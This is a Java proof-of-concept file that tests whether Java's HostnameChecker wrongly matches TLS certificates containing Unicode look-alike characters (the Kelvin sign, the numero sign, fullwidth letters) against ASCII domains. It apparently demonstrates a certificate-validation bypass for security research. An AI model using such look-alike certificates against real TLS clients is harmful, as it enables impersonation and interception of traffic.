package poc;

import sun.security.util.HostnameChecker ;

import javax.security.auth.x500.X500Principal;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.net.IDN;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;

import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static sun.security.util.HostnameChecker.TYPE_TLS;

public class JavaHostnameCheckerPoc {

    public void runTests() throws Exception {

        X509Certificate mockCert = mock(X509Certificate.class);
        X500Principal principal = new X500Principal("CN=montrehac\u212A.ca, OU=Fake, O=Fake, C=CA");
        when(mockCert.getSubjectX500Principal()).thenReturn(principal);

        //evil.cert : CN=montrehacK.ca
        //normal.cert : CN=montrehack.ca
        //nodejs_normal.cert : CN=nodejs.org
        //nodejs_evil.cert : CN=№dejs.org

        validateDomain("montrehack.ca",mockCert,"Mock certificate file with montrehac[U+212A].ca");

        validateDomain("montrehack.ca",cert("/certs/montrehack_normal.cert"),"Normal Certificate with ascii only");
        validateDomain("montrehack.ca",cert("/certs/montrehack_evil.cert"),"Certificate file with U+212A");
        validateDomain("gosecure.net",cert("/certs/montrehack_evil.cert"),"Certificate intended to failed"); //Test just to make sure their is a validation made
        validateDomain("montrehac\u212A.ca",cert("/certs/montrehack_normal.cert"),"Normal certificate with malicious input (montrehac[U+212A].ca)");
        validateDomain("\u2116dejs.org",cert("/certs/nodejs_normal.cert"),"Normal certificate with malicious input ([U+2116]dejs.org)");

        validateDomain("nodejs.org",cert("/certs/nodejs_evil.cert"),"Evil certificate with normal input ([U+2116]dejs.org)");

        //Demonstration that all letters of the alphabet can be used
        validateDomain("montreh\uff41ck.ca",cert("/certs/montrehack_normal.cert"),"Normal certificate with malicious input (montreh[U+ff41]ck.ca)");
        validateDomain("montr\uff45hack.ca",cert("/certs/montrehack_normal.cert"),"Normal certificate with malicious input (montr[U+ff45]hack.ca)");
    }

    public X509Certificate cert(String certFile) throws FileNotFoundException, CertificateException {
        InputStream stream = JavaHostnameCheckerPoc.class.getResourceAsStream(certFile);
        //FileInputStream stream = new FileInputStream(certFile);
        return (X509Certificate) CertificateFactory.getInstance("X.509").generateCertificate(stream);
    }

    public void validateDomain(String domain,X509Certificate cert,String description) throws Exception {
        HostnameChecker checker = HostnameChecker.getInstance(TYPE_TLS);

        boolean validationSucceed;
        try {
            checker.match(domain, cert);
            validationSucceed = true;
        }
        catch (Exception e) {
            validationSucceed = false;
        }

        System.out.println(description+": "+(validationSucceed?"SUCCEED":"FAILED"));
    }

    public static void main(String[] args) throws Exception {
        System.out.println("Domain: "+IDN.toASCII("montrehac\u212A"));
        new JavaHostnameCheckerPoc().runTests();
    }

}
